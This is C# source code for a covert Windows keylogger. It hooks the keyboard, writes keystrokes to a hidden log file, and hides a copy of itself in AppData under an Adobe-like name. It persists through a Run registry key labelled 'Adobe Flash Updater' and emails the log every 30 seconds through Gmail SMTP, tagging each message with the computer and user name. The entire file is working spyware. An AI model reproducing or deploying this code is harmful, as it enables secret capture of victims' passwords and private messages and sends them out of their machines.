using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Timers;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using Microsoft.Win32;
using System.Text;

namespace WindowsFormsApplication1
{
    static class Program
    {
        const string logfilename = "inteldrv.log";

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        //public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), logfilename);
        public static string path = Path.Combine(Path.GetTempPath(), logfilename);
        public static string previousWindowTitle = "";
        
        //File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
        public static byte caps = 0, shift = 0, failed = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        // DllImports for getting the current active window title
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            // Create log file and set hidden file attribute
            if (!File.Exists(path))
            {
                File.Create(path);
                FileAttributes attributes = File.GetAttributes(path);
                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                Console.WriteLine("The {0} file is now hidden.", path);
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            // Here is the magic that prevents a Window from being created :) [http://stackoverflow.com/a/522245]
            Form1 TheForm = new Form1();

            _hookID = SetHook(_proc);
            Program.startup();
            System.Timers.Timer timer;
            timer = new System.Timers.Timer();
            timer.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
            timer.AutoReset = true;
            // Current timer set to 30 sec for testing purposes
            timer.Interval = 30000;
            timer.Start();

            Application.Run();
        }

        public static void startup()
        {
            //Copy to folder in AppData
            //If destination folder does not exist then create it
            string source = Application.ExecutablePath.ToString();
            string destinationFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            destinationFolder = System.IO.Path.Combine(destinationFolder, "Adobe");
            if (!System.IO.Directory.Exists(destinationFolder))
                System.IO.Directory.CreateDirectory(destinationFolder);
            string destination = System.IO.Path.Combine(destinationFolder, "afrmsvc.exe");
            try
            {
                System.IO.File.Copy(source, destination, false);
                source = destination;
                FileAttributes attributes = File.GetAttributes(destination);
                File.SetAttributes(destination, File.GetAttributes(destination) | FileAttributes.Hidden);
                Console.WriteLine("The {0} file is now hidden.", destination);
            }
            catch
            {
                Console.WriteLine("Could not copy file to {0}.", destinationFolder);
            }

            //Find if the file already exist in startup
            const string userRoot = "HKEY_CURRENT_USER";
            const string subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            const string keyName = userRoot + "\\" + subkey;
            try
            {
                RegistryKey regStartKey = Registry.CurrentUser.OpenSubKey(subkey, false);

                if (regStartKey.GetValue("Adobe Flash Updater") == null)
                {
                    Console.WriteLine("Value does not exist in the registry");
                    Registry.SetValue(keyName, "Adobe Flash Updater", destination);
                    Console.WriteLine("Set value in the registry");
                } else
                {
                    Console.WriteLine("Value already set in the registry");
                }

                regStartKey.Close();
            }
            catch
            {
                Console.WriteLine("Error setting startup reg key.");
            }
            // The following has a high potential to fail if not running as Admin and UAC is on
            // Future version will check those first, and determine if other people use the computer (existance of other profiles), then attempt to write to all users
            /*
            //Try to add to all users
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);

                if (registryKey.GetValue("Nvidia driver") == null)
                {
                    registryKey.SetValue("Nvidia driver", source);
                }

                registryKey.Close();//dispose of the key
            }
            catch
            {
                //Console.WriteLine("Error setting startup reg key for all users.");
            }*/
        }

        // This is needed to remove the hidden attribute on the file to be able to overwrite it
        private static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
        {
            return attributes & ~attributesToRemove;
        }

        // Return the active window title as a string
        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                if (previousWindowTitle != Buff.ToString())
                {
                    //Console.WriteLine("{" + Buff.ToString() + "}");
                    previousWindowTitle = Buff.ToString();
                    return Buff.ToString();
                }
                else
                    return null;
            }
            return null;
        }

        public static void OnTimedEvent(object source, EventArgs e)
        {
            // TODO: This section needs to be reworked to test for a situation where the firewall denies our output.
            
            // If there's nothing to send.... don't do it
            if (new FileInfo(path).Length == 0)
            {
                Console.WriteLine("Nothing to send - aborting email message [{0}]", DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt"));
                return;
            }

            // The following gmail login attempt will be denied by default.
            // Go to security settings at the followig link https://www.google.com/settings/security/lesssecureapps and enable less secure apps
            // for email to work

            // The username and password are in a public class called, you guessed it, Password
            // In the class just add the following:
            //   public const string username = "<username>";
            //   public const string password = "<password>";
            // *Make sure to add the class file the gitignore file, otherwise :(

            // Future versions will be configurable to use other email providers and not rely on google
            const string emailAddress = Password.username;
            const string emailPassword = Password.password;

            System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
            msg.To.Add(emailAddress);
            msg.From = new MailAddress(emailAddress, emailAddress, System.Text.Encoding.UTF8);
            msg.Subject = "LOG [Computer:" + Environment.MachineName + "] [Username:" + Environment.UserName + "]";
            msg.SubjectEncoding = System.Text.Encoding.UTF8;
            msg.Body = "Please view the attachment for details";
            msg.BodyEncoding = System.Text.Encoding.UTF8;
            msg.IsBodyHtml = false;
            msg.Priority = MailPriority.High;

            SmtpClient client = new SmtpClient(); 
            //Network Credentials for Gmail            
            client.Credentials = new System.Net.NetworkCredential(emailAddress, emailPassword);
            client.Port = 587;
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;
            Attachment data = new Attachment(Program.path);
            msg.Attachments.Add(data);

            try
            {
                client.Send(msg);
                failed = 0;
            }
            catch (Exception f)
            {
                data.Dispose();
                failed = 1;
                throw new Exception("Mail.Send: " + f.Message);                
            }

            data.Dispose();

            if (failed == 0)
            {
                FileAttributes attributes = File.GetAttributes(path);

                // Check if the log file is hidden
                if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    // Remove hidden attribute from file - Can not overwrite the file otherwise.
                    attributes = RemoveAttribute(attributes, FileAttributes.Hidden);
                    File.SetAttributes(path, attributes);
                    Console.WriteLine("The {0} file is no longer hidden.", path);
                    File.WriteAllText(Program.path, ""); //overwrite the file
                    Console.WriteLine("The {0} file has been overwritten.", path);
                    File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                    Console.WriteLine("The {0} file is now hidden.", path);
                }
                else
                {
                    File.WriteAllText(Program.path, ""); //overwrite the file
                    Console.WriteLine("The {0} file has been overwritten.", path);
                    // Let's try to make the file hidden
                    File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                    Console.WriteLine("The {0} file is now hidden,",path);
                }
            }

            failed = 0;

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Much of the following code needs to be re-written. Some special characters are not logged correctly.
        // What if the user is HOLDING the SHIFT key while typing? What if caps lock is enabled/disabled?
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // This is stupid. Leaving here for posterity sake
                /*Process[] ProcessList = Process.GetProcesses();
                foreach (Process proc in ProcessList)
                {
                    if (proc.MainWindowTitle.Contains("Calculator"))
                    {
                        proc.Kill();
                    }
                }*/

                string windowTitle = GetActiveWindowTitle();
                if (windowTitle != null)
                    Console.WriteLine("{" + windowTitle + "}");
                StreamWriter sw = File.AppendText(Program.path);                
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keys.Shift == Control.ModifierKeys) Program.shift = 1;

                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        sw.Write(" ");
                        break;
                    case Keys.Return:
                        sw.WriteLine("");
                        break;
                    case Keys.Back:
                        sw.Write("[BACKSPACE]");
                        break;
                    case Keys.Tab:
                        sw.Write("[TAB]");
                        break;
                    case Keys.D0:
                        if (Program.shift == 0) sw.Write("0");
                        else sw.Write(")");
                        break;
                    case Keys.D1:
                        if (Program.shift == 0) sw.Write("1");
                        else sw.Write("!");
                        break;
                    case Keys.D2:
                        if (Program.shift == 0) sw.Write("2");
                        else sw.Write("@");
                        break;
                    case Keys.D3:
                        if (Program.shift == 0) sw.Write("3");
                        else sw.Write("#");
                        break;
                    case Keys.D4:
                        if (Program.shift == 0) sw.Write("4");
                        else sw.Write("$");
                        break;
                    case Keys.D5:
                        if (Program.shift == 0) sw.Write("5");
                        else sw.Write("%");
                        break;
                    case Keys.D6:
                        if (Program.shift == 0) sw.Write("6");
                        else sw.Write("^");
                        break;
                    case Keys.D7:
                        if (Program.shift == 0) sw.Write("7");
                        else sw.Write("&");
                        break;
                    case Keys.D8:
                        if (Program.shift == 0) sw.Write("8");
                        else sw.Write("*");
                        break;
                    case Keys.D9:
                        if (Program.shift == 0) sw.Write("9");
                        else sw.Write("(");
                        break;
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                    case Keys.LWin:
                    case Keys.RWin:
                    case Keys.Apps:
                        sw.Write("");
                        break;
                    case Keys.OemQuestion:
                        if (Program.shift == 0) sw.Write("/");
                        else sw.Write("?");
                        break;
                    case Keys.OemOpenBrackets:
                        if (Program.shift == 0) sw.Write("[");
                        else sw.Write("{");
                        break;
                    case Keys.OemCloseBrackets:
                        if (Program.shift == 0) sw.Write("]");
                        else sw.Write("}");
                        break;
                    case Keys.Oem1:
                        if (Program.shift == 0) sw.Write(";");
                        else sw.Write(":");
                        break;
                    case Keys.Oem7:
                        if (Program.shift == 0) sw.Write("'");
                        else sw.Write('"');
                        break;
                    case Keys.Oemcomma:
                        if (Program.shift == 0) sw.Write(",");
                        else sw.Write("<");
                        break;
                    case Keys.OemPeriod:
                        if (Program.shift == 0) sw.Write(".");
                        else sw.Write(">");
                        break;
                    case Keys.OemMinus:
                        if (Program.shift == 0) sw.Write("-");
                        else sw.Write("_");
                        break;
                    case Keys.Oemplus:
                        if (Program.shift == 0) sw.Write("=");
                        else sw.Write("+");
                        break;
                    case Keys.Oemtilde:
                        if (Program.shift == 0) sw.Write("`");
                        else sw.Write("~");
                        break;
                    case Keys.Oem5:
                        sw.Write("|");
                        break;
                    case Keys.Capital:
                        if (Program.caps == 0) Program.caps = 1;
                        else Program.caps = 0;
                        break;
                    default:
                        if (Program.shift == 0 && Program.caps == 0) sw.Write(((Keys)vkCode).ToString().ToLower());
                        if (Program.shift == 1 && Program.caps == 0) sw.Write(((Keys)vkCode).ToString().ToUpper());
                        if (Program.shift == 0 && Program.caps == 1) sw.Write(((Keys)vkCode).ToString().ToUpper());
                        if (Program.shift == 1 && Program.caps == 1) sw.Write(((Keys)vkCode).ToString().ToLower());
                        break;
                }
                Program.shift = 0;
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}
